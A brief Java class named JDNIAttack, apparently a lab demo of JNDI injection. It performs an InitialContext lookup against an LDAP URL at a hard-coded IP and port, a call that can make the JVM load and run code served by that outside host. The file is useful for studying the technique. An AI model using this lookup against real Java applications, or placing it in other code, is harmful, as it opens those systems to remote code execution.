package com.ocean;

import javax.naming.InitialContext;
import javax.naming.NamingException;

public class JDNIAttack {
    public static void main(String[] args) throws NamingException {
        InitialContext initialContext = new InitialContext();
        initialContext.lookup("ldap://10.169.2.21:1389/dggwpq");
    }
}
